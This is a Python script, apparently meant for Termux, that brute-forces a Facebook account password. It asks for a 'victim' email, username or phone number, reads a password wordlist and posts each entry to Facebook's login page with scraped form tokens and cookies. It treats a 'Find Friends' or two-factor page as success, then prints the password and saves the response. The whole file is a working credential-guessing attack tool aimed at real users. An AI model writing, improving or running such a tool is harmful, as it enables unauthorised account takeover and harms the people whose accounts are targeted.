import requests
import threading
# import urllib.request
import os
from bs4 import BeautifulSoup
import sys
os.system("clear")
__banner__= os.system("python banner.py")
post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
payload={}
cookie={}

def create_form():
	form=dict()
	cookie={'fr':'0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

	data=requests.get(post_url,headers=headers)
	for i in data.cookies:
		cookie[i.name]=i.value
	data=BeautifulSoup(data.text,'html.parser').form
	if data.input['name']=='lsd':
		form['lsd']=data.input['value']
	return (form,cookie)

def function(email,passw,i):
	global payload,cookie
	if i%10==1:
		payload,cookie=create_form()
		payload['email']=email
	payload['pass']=passw
	r=requests.post(post_url,data=payload,cookies=cookie,headers=headers)
	if 'Find Friends' in r.text or 'Two-factor authentication required' in r.text:
		open('temp','w').write(str(r.content))
		print('\npassword is : ',passw)
		return True
	return False

print(__banner__)
fn = input("Just Enter File Name:")
if os.path.exists("/data/data/com.termux/files/home/DORKLIN/"+fn+".txt") != False:

    path = "/data/data/com.termux/files/home/DORKLIN/"+fn+".txt"
    file=open(path,'r')

    V=input('\033[1;34mEnter Victm Gmail|Username|Number: ')

    print("\nTarget  ID : ",V)
    print("\nTrying Passwords from list ...")

    i=0
    while file:
	    passw=file.readline().strip()
	    i+=1
	    if len(passw) < 6:
		    continue
	    print(str(i) +" : ",passw)
	    if function(V,passw,i):
		    break
else:
    print("\033[1;34mFile not exists...!!!")
    pa = input("\033[1;33mDo you want custom path:")
    if pa == "y" or pa == "yes":
        pat = input("Enter path:")
        if os.path.exists(pat) != False:
            file = open(pat,'r')
            info = input("Enter Victim Gmail|Username|Number:")
            print("Trget ID :",info)
            print("Traying Password from list...")
            i = 0
            while file:
                passw=file.readline().strip()
                i+=1
                if len(passw) < 6:
                    continue
                print(str(i)+" : ",passw)
                if function(info,passw,i):
                    break
#finished
